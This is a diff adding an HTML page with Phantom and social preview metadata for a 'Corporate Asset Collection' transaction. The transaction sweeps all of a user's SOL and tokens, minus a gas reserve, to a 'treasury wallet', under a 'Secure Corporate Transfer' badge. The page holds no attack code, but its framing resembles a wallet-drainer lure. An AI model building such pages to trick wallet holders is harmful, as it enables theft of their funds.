@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Основные метаданные -->
+    <title>🏢 Corporate Asset Collection</title>
+    <meta name="description" content="Secure automated transfer of corporate assets to treasury wallet">
+    
+    <!-- Иконки (может быть GIF!) -->
+    <link rel="icon" href="/corporate-collect-icon.gif" type="image/gif">
+    <link rel="apple-touch-icon" href="/corporate-collect-icon.gif">
+    <link rel="shortcut icon" href="/corporate-collect-icon.gif">
+    
+    <!-- Open Graph метаданные для Phantom -->
+    <meta property="og:title" content="🏢 Corporate Asset Collection">
+    <meta property="og:description" content="Secure automated transfer system">
+    <meta property="og:image" content="https://yourcompany.com/transaction-preview.gif">
+    <meta property="og:image:width" content="400">
+    <meta property="og:image:height" content="300">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://yourcompany.com">
+    
+    <!-- Twitter метаданные -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🏢 Corporate Asset Collection">
+    <meta name="twitter:description" content="Secure automated transfer system">
+    <meta name="twitter:image" content="https://yourcompany.com/transaction-preview.gif">
+    
+    <!-- Phantom-специфичные метаданные -->
+    <meta name="phantom:title" content="🏢 Asset Collection">
+    <meta name="phantom:description" content="Corporate treasury transfer">
+    <meta name="phantom:icon" content="https://yourcompany.com/corporate-collect-icon.gif">
+    
+    <!-- Дополнительные метаданные -->
+    <meta name="application-name" content="Corporate Asset Collector">
+    <meta name="theme-color" content="#FF6B35">
+    
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 400px;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        h1 {
+            margin: 0 0 10px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        
+        .info-box {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .info-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .label {
+            opacity: 0.8;
+        }
+        
+        .value {
+            font-weight: 600;
+        }
+        
+        .warning {
+            background: rgba(255, 107, 53, 0.2);
+            border: 1px solid rgba(255, 107, 53, 0.4);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            border-radius: 20px;
+            padding: 5px 12px;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Лого с анимацией -->
+        <div class="logo">
+            <img src="/corporate-collect-icon.gif" alt="Corporate Asset Collection" />
+        </div>
+        
+        <!-- Заголовок -->
+        <h1>🏢 Asset Collection</h1>
+        <p class="subtitle">Corporate Treasury Transfer</p>
+        
+        <!-- Информация о транзакции -->
+        <div class="info-box">
+            <div class="info-item">
+                <span class="label">📊 Operation:</span>
+                <span class="value">Asset Transfer</span>
+            </div>
+            <div class="info-item">
+                <span class="label">🏛️ Destination:</span>
+                <span class="value">Treasury Wallet</span>
+            </div>
+            <div class="info-item">
+                <span class="label">💰 Assets:</span>
+                <span class="value">SOL + Tokens</span>
+            </div>
+            <div class="info-item">
+                <span class="label">⛽ Gas Reserve:</span>
+                <span class="value">~$2 (0.015 SOL)</span>
+            </div>
+        </div>
+        
+        <!-- Бейдж безопасности -->
+        <div class="security-badge">
+            <span>🔒</span>
+            <span>Secure Corporate Transfer</span>
+        </div>
+        
+        <!-- Предупреждение -->
+        <div class="warning">
+            ⚠️ <strong>Important:</strong> This will transfer all your Solana assets except the gas reserve to the corporate treasury. This action cannot be undone.
+        </div>
+    </div>
+    
+    <script>
+        // Логирование для отладки
+        console.log('🏢 Corporate Asset Collection metadata page loaded');
+        console.log('Current URL:', window.location.href);
+        
+        // Проверяем, загружается ли страница в Phantom
+        if (navigator.userAgent.includes('Phantom')) {
+            console.log('📱 Detected Phantom browser');
+        }
+        
+        // Добавляем pulse эффект к логотипу
+        document.querySelector('.logo img').classList.add('pulse');
+    </script>
+</body>
+</html>
